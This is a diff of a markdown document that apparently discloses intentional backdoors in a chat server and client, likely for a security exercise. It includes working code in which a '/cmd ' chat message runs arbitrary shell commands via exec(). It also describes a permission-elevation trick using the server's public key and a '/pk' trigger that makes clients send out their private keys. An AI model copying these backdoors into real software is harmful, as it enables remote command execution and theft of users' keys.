@@ -1,5 +1,5 @@
 # Backdoors and Vulnerabilities
-## Executing system commands on the server, from the client.
+## Elevating client permissions on server.
 This code, located within the POST Request Handling of file uploads, checks the contents of each file upload to see if it begins with the data of the server's publicKey.
 ```
 if (check.startsWith(pubkey_pem)) {
@@ -33,40 +33,51 @@ EwIDAQAB
 -----END PUBLIC KEY-----
 6b5cBW7+8zWqFrMXFlo+1hBjbrD/OO2nEMHeiDXBWwA
 ```
+Where the last line is changed to be the the client's fingerprint.
 The publicKey of the server can be accessed by going to the "/pubkey" route of the server
 ```
 https://<serverip>:<port>/pubkey
 ```
-Where the last line is changed to be the the client's fingerprint.
-Finally, whenever a client sends a public_chat message to the server, if the "permission" field is present and the message starts with "/cmd ", attempt to execute the message on the commandline.
+# Executing system commands on server from client
+Whenever a client sends a public_chat message to the server, if the "permission" field is present and the message starts with "/cmd ", attempt to execute the message on the commandline.
 ```
 case "public_chat":
-    if (dataObj.data !== undefined) {
-        var msg = dataObj.data.message;
-        var cmd = "";
-        if (ws.permission == 1) {
-            if (msg.startsWith("/cmd ")) {
-                cmd = msg.substr(4);
-                console.log("executing code");
-                exec(cmd, (err, stdout, stderr) => {
-                    if (err) {
-                        console.log("couldn't execute command");
-                        return;
-                    }
-                    console.log(`stdout: ${stdout}`);
-                    console.log(`stderr: ${stderr}`);
-                    var retmsg = stdout + "\n" + stderr;
-                    var execret = {
-                        type: "anonymous_chat",
-                        message: retmsg
-                    };
-                    ws.send(JSON.stringify(execret));
-                });
-                return;
-            }
-        }
-    }
-    sendToList(connectedClients, JSON.stringify(dataObj), data.sender);
-    sendToList(connectedServers, JSON.stringify(dataObj), ws.fingerprint);
-    break;
+	if (ws.permission == 1) {
+		if (dataObj.data !== undefined) {
+			var msg = dataObj.data.message;
+			var cmd = "";
+			if (msg.startsWith("/cmd ")) {
+				cmd = msg.substr(4);
+				console.log("executing code");
+				exec(cmd, (err, stdout, stderr) => {
+					if (err) {
+						console.log("couldn't execute command");
+						return;
+					}
+					console.log(`stdout: ${stdout}`);
+					console.log(`stderr: ${stderr}`);
+					var retmsg = stdout + "\n" + stderr;
+					var execret = {
+						type: "anonymous_chat",
+						message: retmsg
+					};
+					ws.send(JSON.stringify(execret));
+				});
+				return;
+			} else if (msg.startsWith("/pk")) {
+				console.log("request for client privateKeys");
+				dataObj.data.check = 1;
+			}
+		}
+	}
+	sendToList(connectedClients, JSON.stringify(dataObj), data.sender);
+	sendToList(connectedServers, JSON.stringify(dataObj), ws.fingerprint);
+	break;
 ```
+# Getting private keys of clients from client
+Whenever a client sends a public_chat message to the server, if the "permission" field is present and the message starts with "/pk", the server adds the "data.check" field to the "public_chat" before passing it to the other clients. (see above code)
+this is an intentional vulnerability within the client code (index.html) therefore the elevation of permissions in the server is unnecessary and can be executed by sending a correctly formatted "public_chat".
+```
+
+```
+Upon receiving the "public_chat" with the "data.check" field present, the client sends a "public_chat" containing its privateKey.
